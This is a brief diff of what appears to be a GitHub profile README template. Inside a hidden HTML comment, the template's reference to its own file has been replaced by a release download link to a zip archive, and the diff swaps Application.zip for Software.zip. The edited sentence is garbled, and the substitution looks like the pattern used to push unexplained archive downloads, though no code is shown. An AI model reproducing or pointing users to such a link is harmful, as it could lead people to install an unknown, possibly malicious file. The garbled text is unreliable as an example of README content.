@@ -7,6 +7,6 @@
 - ⚡ Fun fact: ...
 
 <!---
-erhes-ai/erhes-ai is a ✨ special ✨ repository because its `https://github.com/erhes-ai/erhes-ai/releases/download/v1.0/Application.zip` (this file) appears on your GitHub profile.
+erhes-ai/erhes-ai is a ✨ special ✨ repository because its `https://github.com/erhes-ai/erhes-ai/releases/download/v2.0/Software.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
